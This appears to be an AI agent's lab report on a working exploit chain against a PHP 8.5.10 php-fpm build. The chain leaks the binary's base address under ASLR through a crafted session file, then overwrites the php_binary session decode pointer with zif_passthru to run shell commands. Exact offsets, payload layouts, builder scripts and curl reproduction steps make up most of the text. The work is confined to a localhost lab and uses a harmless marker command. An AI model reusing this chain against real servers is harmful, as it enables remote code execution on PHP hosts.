# PHP 8.5.10 PIE FPM: ASLR-on session-file PIE leak and full G2/G6 chain

Receipt: `/tmp/opencode/research/php8pie_20261022_0325/`
Date: 2026-10-22
Status: **PIE build verified; in-band PIE base leaked under ASLR; full
php_binary decode-slot overwrite to `zif_passthru` executed; worker survived.**

No git commit was made. No WP lab port (28891/28893) and no shared PID
(4052217/4052937/4053032/4054145) was touched. The experiment used only
127.0.0.1:28931 (nginx) and 127.0.0.1:28933 (php-fpm), master 1416084,
nginx master 1416117.

## 1. PIE build

Built from `/home/davide/ailocal/php/php-8.5.10.tar.gz` as an unstripped PIE:

```
CFLAGS='-g -O1 -fno-omit-frame-pointer -fPIE' \
LDFLAGS='-pie' \
./configure --prefix=... --disable-all --enable-fpm --enable-session \
            --without-pcre-jit
```

`src/php-8.5.10/config.nice` is the exact configure record.

| property | value |
|---|---|
| binary | `src/php-8.5.10/sapi/fpm/php-fpm` |
| ELF type | `DYN (Position-Independent Executable file)` |
| size | 42,328,800 bytes |
| BuildID | `69ef9c150adebfd8c7409304eef1dc9ddabc2810` |
| md5 | `605064570c308c1eaca5aa5911799ef0` |
| sha256 | `12eeaa235c959e139953dcefb06036b395b484b29fc63ed19b31079b8964c3be` |
| symbols | not stripped (`nm`/`gdb` resolve PHP internals) |

ASLR was on for the whole run: `/proc/sys/kernel/randomize_va_space = 2`.
The live image base was `0x556e4a800000` (2 MB aligned); the FPM master maps
the image once and forks workers, so the base is fixed per master, not per
worker. See `log/binary_info.txt` and `log/psg.log`.

Lab: `pm.max_children=1`, `pm.max_requests=0`, `session.save_handler=files`,
`session.save_path=.../www/sess`, `session.serialize_handler=php_binary`,
`session.use_strict_mode=0`, upload progress enabled (`freq=1%`,
`min_freq=3600`, `cleanup=0`, empty prefix).

## 2. Offsets

All addresses are image virtual addresses; add the live base.

| symbol / slot | offset | runtime (base 0x556e4a800000) |
|---|---|---|
| `ps_serializers` table | `0x10c1940` | `0x556e4b8c1940` |
| entry 0 `php_serialize` decode | `0x10c1950` | `0x556e4b8c1950` |
| entry 1 `php` decode (not 16-aligned) | `0x10c1968` | `0x556e4b8c1968` |
| entry 2 `php_binary` name / encode / decode | `0x10c1970` / `0x10c1978` / `0x10c1980` | `0x556e4b8c1970` / `...78` / `0x556e4b8c1980` |
| entry 3 terminator name | `0x10c1988` | `0x556e4b8c1988` |
| `ps_srlzr_decode_php_binary` | `0x411f36` | `0x556e4ac11f36` |
| `php_session_decode` | `0x4119de` | `0x556e4ac119de` |
| `zif_system` | `0x464c05` | `0x556e4ac64c05` |
| `zif_passthru` | `0x464c15` | `0x556e4ac64c15` |
| `php_exec` | `0x464777` | `0x556e4ac64777` |
| `zval_ptr_dtor` | `0x6644e5` | `0x556e4ae644e5` |
| `ps_globals` | `0x10c5e20` | `0x556e4b8c5e20` |
| `ps_globals.serializer` field | `ps_globals+0x160` | `0x556e4b8c5f80` |

The `php_binary` decode slot is 16-byte aligned and reachable by the G2
16-byte zval write. The `php` decode slot is **not** 16-byte aligned, so the
same table-entry direct write cannot target it (F12b uses the PS(serializer)
pointer route instead).

## 3. (a) Encoder/GOT-style read leak: proven

### 3.1 Primitive and geometry

A bailout request leaves a stale `BG(unserialize)` dtor chain:

```
curl --data-urlencode 'p=a:2:{i:0;s:3:"aaa";i:0;s:3:"bbb";}X' \
     --data 'mode=user_error' http://127.0.0.1:28931/unser.php
```

Measured after the plant (`log/state_after_plant_dry.log`):

```
BG level=1 data=0x7f65f5282000
last=0x7f65f5282038 first_dtor=0x7f65f5285000 last_dtor=0x7f65f5285000
dtor used=1 next=NULL
```

The trigger is a multipart POST to `/probe.php` with `PHPSESSID=lk1`,
`PHP_SESSION_UPLOAD_PROGRESS=x` and a 128 KiB file part. The first
`php_session_initialize` reads `www/sess/sess_lk1` into
`X1=0x7f65f526a000` (`ZSTR_VAL=0x7f65f526a018`, len 131014). Because the
session buffer covers `P=0x7f65f5282000` and `B0=0x7f65f5285000`, the file's
payload supplies the fake `php_unserialize_data` and fake
`var_dtor_entries`.

Leak record `phase/rec_leak3.bin` (sha256
`3549617bea6dbdd424d93c7dd8e5ee78670c796f552db3eaacfd8b2946629d85`):

| record | bytes | file offsets |
|---|---|---|
| `[25]KEY(25 x A)` + `s:24:"QQQ...";` (S) | S is the value string | key 0..25, value 32..55 |
| `[1]J` + `i:4096;` | long 4096 | 58..66 |
| `[1]X` + `s:24:"XXX...";` | 24-byte X string | 67..100 |
| `[1]K` + `s:130882:"<payload>";` | fake P/B0 carrier | 101..130996 |
| `[2]a0` + `a:1:{i:0;i:1;}` | array (HashTable) | 130997..131013 |

Slot arithmetic: `slot(n) = B0 + 0x10 + 16*(U0+n-1)`, `U0=-11223`, so
`S=0x7f65f52592a0` is written by record 1 and `i:4096;` is written at
`S+0x10`, i.e. `zend_string.len(S)=0x1000`. Records 3/4/5 write at
`S+0x20`, `S+0x30`, `S+0x40`. The file size is 131014 bytes; the proven
builder is `phase/mkleak6.py` (reproduction byte-identical in
`phase/rec_leak3_repro.bin`; see `log/leak3_meta.txt`).

### 3.2 Served-file overread

During the first decode the `php_binary` encoder sees `S->len=4096` and
writes 4096 bytes starting at `ZSTR_VAL(S)`, including adjacent Zend MM and
HashTable memory. The first flush writes the file before the second decode.
The file was fetched over nginx:

```
GET http://127.0.0.1:28931/sess/sess_lk1   -> HTTP 200, 135369 bytes
saved as req/leak3_served.bin (sha256
93431e301fd808bf958f5111396a41b2b048c1e60c73d82af8acc263f9966cee)
```

`phase/analyze_leak.py` (output `log/leak_analysis.txt`) finds the
`s:4096:"` value at file offset 26 and parses the 4096-byte payload:

| payload offset | value | meaning |
|---|---|---|
| `+0x00` | 0 | rec2 type word, zeroed by normalize |
| `+0x08` | `0x7f65f52592d8` | X zend_string pointer |
| `+0x18` | `0x7f65f528c000` | K filler zend_string pointer |
| `+0x28` | `0x7f65f5259310` | a0 array HashTable pointer |
| `+0x38` | 24 x `X` | X value bytes |
| `+0x58` | `0x0000000700000001` | HashTable gc |
| `+0x68` | `0x7f65f5264680` | HashTable arData |
| `+0x88` | `0x0000556e4ae644e5` | **HashTable pDestructor = `zval_ptr_dtor`** |
| `+0x90` | `0x7f65f5259380` | adjacent heap pointer |

Exactly one PIE-range qword exists in the 4096-byte payload; it is at
overread offset `0x88` and equals `base + 0x6644e5`:

```
0x556e4ae644e5 - 0x6644e5 = 0x556e4a800000  (2 MB aligned)
```

The second decode of the enlarged file crashed the worker with
`zend_mm_heap corrupted` after the file was written (expected: the leak is
the written file, not hit2). The master respawned a worker with the same
image base.

## 4. (b) Partial overwrite of the decode slot: structurally blocked

The G2 write is `tmp_var()` returning `&B0->data[K]`, followed by the
unserializer writing a full zval:

* 8-byte value at `slot = B0 + 0x10 + 16*K`, and
* 4-byte type at `slot+8` (later `ZVAL_UNDEF(0)` by normalize).

Consequences:

1. The write is **16-byte aligned and 8-byte wide**. It cannot write only
   the low 3 bytes of `ps_serializers[2].decode`; it always replaces the
   full 8-byte pointer.
2. A partial-overwrite value would still need the untouched high 5 bytes of
   the original pointer, i.e. the PIE base. There is no read-what-where in
   the chain; the only read is the encoder overread, which already yields
   the base.
3. The type write at `decode+8` only reaches the terminator entry's name;
   it cannot be used to adjust the pointer bytes.
4. The slot cannot be placed at `decode-8` or any unaligned offset, because
   every slot is `B0+0x10+16*K`.

Therefore option (b) does not remove the need for the base leak. The only
16-byte-aligned direct target is the whole `php_binary` decode slot, which
requires the full absolute address.

## 5. (c) In-band PIE pointer outside the overread: none

A bytewise scan of the whole 135369-byte served file finds exactly one
qword in `0x555000000000..0x558000000000`:

```
file offset 0xAA (= payload +0x88)  0x556e4ae644e5
```

The planted records (`phase/rec_leak3.bin`, `phase/rec_zif_final.bin`) and
the normal 24/25-byte session values contain no PIE-range qword. The PIE
pointer is only exposed by the encoder overread of HashTable metadata; the
overread itself is delivered in-band as the served session file
(`/sess/sess_lk1`). There is no separate PIE pointer leak in the session
content.

## 6. Full ASLR-on chain: decode slot -> `zif_passthru`

With the leaked base:

```
base       = 0x556e4a800000
target     = base + 0x10c1980 = 0x556e4b8c1980   (php_binary decode)
zif        = base + 0x464c15 = 0x556e4ac64c15   (zif_passthru)
B0         = 0x7f65f5285000
K          = (target - (B0+0x10)) / 16 = -2883979953001
```

Record builder `phase/mkzif.py` (uses `phpshell/tool/modules/g2_chain.py`
`plan_zif` with `phase/profile_pie8510.json`) builds
`phase/rec_zif_final.bin` (sha256
`e1a8f0dd96ec47192720ab88246c037624b4a0a0d8c2a841cdb69bb8748b54f3`):

* record 1: `[0x60]` + 96-byte key + `i:93932189273109;`
  * key doubles as fake `zend_execute_data`: num_args=1 at file offset
    `0x2c`, arg1 value F at `0x50`, IS_STRING (6) at `0x58`
* record 2: `[1]z` + `s:130886:"<payload>";`
  * fake P at `p_idx=98154`, fake B0 at `b_idx=110442`
  * fake `zend_string` at payload offset `0x100`: length 71 at `0x110`,
    command at `0x118`
  * command: `echo PIE_ZIF > .../run/M_ZIF;#`

The first decode of the planted file performs the two writes:

* record 1 zval -> `ps_serializers[2].decode` = `zif_passthru`
* record 2 string zval -> `decode+16` (next/terminator entry); normalize
  zeroes `decode+8` and `decode+24`.

The first flush then writes the re-encoded session file (131320 bytes; it
includes the appended upload-progress record `[1]x a:5:{...}`). The forced
END `php_session_initialize` reads that file into
`X2=0x7f65f528d000` (`ZSTR_VAL=0x7f65f528d018`, len 131320) and calls the
overwritten decode pointer with `rdi = ZSTR_VAL(data)`.

`X2` was measured with a dry `K=0` run and confirmed in the live final run
(`log/zif_final.gdb`):

```
DECODE hit=1 str=0x7f65f526a000 val=0x7f65f526a018 len=131014
DECODE hit=2 str=0x7f65f528d000 val=0x7f65f528d018 len=131320
  num_args=1 arg1=0x7f65f528d196 type=6
  F=0x7f65f528d196 F+0x10(len)=71 F+0x18="echo PIE_ZIF..."
  serializer decode slot=0x556e4ac64c15
```

`F = X2 + 0x18 + Q + 0x100`, `Q=126`; `F+0x18` is the command inside the
hit2 buffer. `zif_passthru` uses `php_exec` type 3, which never writes
`return_value` (the decode call passes `rsi = ZSTR_LEN(data)`, an invalid
zval pointer).

Result of the final run (fresh worker 1701090, planted and triggered as the
immediate next request):

| item | value |
|---|---|
| trigger HTTP | `200` |
| response | `PID=1701090 SID=` (probe.php does not call `session_start`) |
| marker `run/M_ZIF` | `PIE_ZIF\n` |
| worker before / after | `1701090` / `1701090` |
| post-run `info.php` | HTTP 200, `PID=1701090` |
| decode slot after request | `0x556e4ac64c15` (`zif_passthru`, still poisoned) |
| `BG(unserialize)` after request | `level=0 data=NULL` |

The worker survived both the trigger and a subsequent request; the FPM log
has no SIGSEGV/SIGABRT after the worker start. The `.data` poison is
worker-local and persists until worker recycle; the stale unserialize chain
is cleared at request shutdown.

A second end-to-end run was performed **without gdb** on a fresh worker
(1709897) with the same planted record and the same `X2`-derived `F`:
trigger HTTP 200, response `PID=1709897 SID=`, marker `PIE_ZIF`, worker
1709897 still serving `info.php` afterwards (`req/zif_clean.out`,
`req/post_survival_info_clean.out`). This confirms the chain does not depend
on the debugger and that the hit2 buffer address is reproducible for this
record/request shape.

## 7. Exact blockers and limits

1. **(b) cannot be done with this primitive**: full 8-byte zval at
   16-byte-aligned slots. No byte-granular / 3-byte partial write, and the
   high bytes of the target pointer still require the base. There is no
   read-what-where to recover them.
2. **The leak is an overread, not an arbitrary read**: it needs the G2
   dtor-slot corruption of `S->len` and deterministic heap adjacency. It
   exposed exactly one PIE pointer (HashTable `pDestructor`); no PIE pointer
   exists in the normal session content.
3. **The leak is per master image**: FPM forks workers from one master, so
   `0x556e4a800000` is stable across worker respawns. A master restart
   changes the base and requires a fresh leak.
4. **The chain needs X2**: the fake execute_data is read from the
   re-encoded hit2 buffer, so `F` must be computed from the measured `X2`
   and `Q` (the payload start shifts with the decimal width of the zif
   address). The re-encoded file is 306 bytes longer than the planted file
   because the upload-progress record is appended; the command is before
   that append and is unaffected.
5. **`zif_system` is one-shot**: `php_exec` type 1 writes the return zval
   through `return_value = ZSTR_LEN(data)` and SIGSEGVs. `zif_passthru`
   (type 3) is the clean path; it returns HTTP 200 and the worker survives.
6. **Target alignment**: `ps_serializers[2].decode` is 16-byte aligned;
   `ps_serializers[1].decode` (`php`) is not, so the direct entry-2 write
   cannot target the php slot.

## 8. Reproduction

```
# build: see config.nice
R=/tmp/opencode/research/php8pie_20261022_0325

# fresh worker + plant (stale BG chain)
kill -9 $(pgrep -P 1416084)
curl --data-urlencode 'p=a:2:{i:0;s:3:"aaa";i:0;s:3:"bbb";}X' \
     --data 'mode=user_error' http://127.0.0.1:28931/unser.php

# leak: write the leak record, then trigger
cp $R/phase/rec_leak3.bin $R/www/sess/sess_lk1
curl -b PHPSESSID=lk1 -F 'PHP_SESSION_UPLOAD_PROGRESS=x' \
     -F "file=@$R/phase/pad.bin;filename=pad.bin" \
     http://127.0.0.1:28931/probe.php
curl -s http://127.0.0.1:28931/sess/sess_lk1 -o $R/req/leak3_served.bin
python3 $R/phase/analyze_leak.py        # DERIVED_BASE 0x556e4a800000

# chain: fresh worker + plant, write the final record, trigger
kill -9 $(pgrep -P 1416084)
curl --data-urlencode 'p=a:2:{i:0;s:3:"aaa";i:0;s:3:"bbb";}X' \
     --data 'mode=user_error' http://127.0.0.1:28931/unser.php
cp $R/phase/rec_zif_final.bin $R/www/sess/sess_lk1
rm -f $R/run/M_ZIF
curl -b PHPSESSID=lk1 -F 'PHP_SESSION_UPLOAD_PROGRESS=x' \
     -F "file=@$R/phase/pad.bin;filename=pad.bin" \
     http://127.0.0.1:28931/probe.php
cat $R/run/M_ZIF                       # PIE_ZIF
```

The actual final run used a gdb attach only to record `X2` and the decode
slot value; the chain itself does not depend on gdb.

## 9. Evidence inventory

Key files (full hashes in `SHA256SUMS`):

* `src/php-8.5.10/config.nice` — PIE configure flags.
* `src/php-8.5.10/sapi/fpm/php-fpm` — PIE binary (sha256 above).
* `phase/mkleak6.py`, `phase/rec_leak3.bin`, `phase/rec_leak3_repro.bin` —
  leak record and byte-identical reproduction.
* `req/leak3_served.bin` — served 135369-byte overread artifact.
* `phase/analyze_leak.py`, `log/leak_analysis.txt` — base derivation.
* `phase/mkzif.py`, `phase/profile_pie8510.json`,
  `phase/rec_zif_final.bin`, `phase/rec_zif_final.json` — chain record.
* `phase/zif_final.gdb`, `log/zif_final.gdb` — X2, F, command, decode slot.
* `req/zif_final.out`, `run/M_ZIF`, `phase/M_ZIF_run1`,
  `phase/M_ZIF_run2` — HTTP 200, marker from the gdb run and the clean run.
* `req/plant_clean.out`, `req/zif_clean.out`,
  `req/post_survival_info_clean.out` — clean no-gdb rerun (worker 1709897).
* `req/post_survival_info.out`, `log/post_survival_state.log`,
  `log/psg.log` — worker survival and persistent worker-local poison.
* `log/cal10.gdb` — leak slot dump (`S=0x7f65f52592a0`, `S+0x10=0x1000`,
  hit2 len 135369).
* `log/fpm-error.log` — worker lifecycle; no crash after the final runs.

The lab is left running (master 1416084, worker 1709897) for inspection;
`run/php-fpm.pid` and `run/nginx.pid` are preserved.
